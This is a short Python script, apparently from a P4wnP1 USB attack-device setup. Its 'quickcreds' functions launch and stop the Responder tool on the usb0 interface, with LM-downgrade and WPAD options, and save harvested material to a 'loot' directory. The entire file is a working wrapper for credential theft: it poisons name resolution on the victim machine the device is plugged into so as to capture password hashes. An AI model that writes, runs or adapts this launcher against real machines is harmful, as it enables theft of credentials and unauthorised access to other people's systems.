#!/usr/bin/env python3
import subprocess, os, signal

STATE = {"proc": None}

def start_quickcreds():
    if STATE["proc"] and STATE["proc"].poll() is None:
        return
    cmd = ("responder -I usb0 -wrf --lm --disable-ess -v "
           "-w /opt/p4wnp1/loot/responder").split()
    os.makedirs("/opt/p4wnp1/loot/responder", exist_ok=True)
    try:
        STATE["proc"] = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    except FileNotFoundError:
        subprocess.Popen(["logger","Responder not installed"])

def stop_quickcreds():
    p = STATE.get("proc")
    if p and p.poll() is None:
        try:
            p.send_signal(signal.SIGINT)
        except Exception:
            p.terminate()
    STATE["proc"] = None

